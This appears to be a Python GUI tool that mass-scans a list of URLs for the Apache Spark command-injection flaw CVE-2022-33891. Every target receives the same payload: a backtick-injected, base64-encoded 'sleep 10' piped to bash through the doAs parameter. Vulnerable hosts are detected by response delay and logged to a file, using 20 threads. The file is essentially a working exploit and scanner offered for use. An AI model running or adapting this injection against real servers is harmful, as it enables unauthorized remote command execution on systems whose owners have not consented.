import datetime
import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def apache_spark_cve_2022_33891_exp(target_url):
    targeturl = f'{target_url}/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`'
    try:
        t1 = datetime.datetime.now()        
        res = requests.post(url=targeturl, verify=False, timeout=20, allow_redirects=False)
        t2 = datetime.datetime.now()
        delta = t2 - t1
        if delta.seconds < 10:
            apache_spark_cve_2022_33891_text.insert(END, "【×】不存在漏洞的url：" + targeturl + "\n")
            apache_spark_cve_2022_33891_text.see(END)
        else:
            apache_spark_cve_2022_33891_text.insert(END, "【！！！！！！】存在漏洞的url：" + targeturl + "\n")
            apache_spark_cve_2022_33891_text.see(END)
            with open("存在Apache Spark 远程命令执行漏洞(CVE-2022-33891)的url.txt", 'a') as f:
                f.write(targeturl + "\n")
        exit(0)
    except Exception as e:
        apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(e) + "\n")
        apache_spark_cve_2022_33891_text.see(END)
def get_apache_spark_cve_2022_33891_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def apache_spark_cve_2022_33891_gui():
    apache_spark_cve_2022_33891 = tk.Tk()
    apache_spark_cve_2022_33891.geometry("910x450")
    apache_spark_cve_2022_33891.title("Apache Spark 远程命令执行漏洞(CVE-2022-33891)一把梭")
    apache_spark_cve_2022_33891.resizable(0, 0)
    apache_spark_cve_2022_33891.iconbitmap('logo.ico')
    global apache_spark_cve_2022_33891_text
    apache_spark_cve_2022_33891_text = scrolledtext.ScrolledText(apache_spark_cve_2022_33891,width=123, height=25)
    apache_spark_cve_2022_33891_text.grid(row=0, column=0, padx=10, pady=10)
    apache_spark_cve_2022_33891_text.see(END)
    addrs = get_apache_spark_cve_2022_33891_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(apache_spark_cve_2022_33891_exp, addr)
    apache_spark_cve_2022_33891.mainloop()
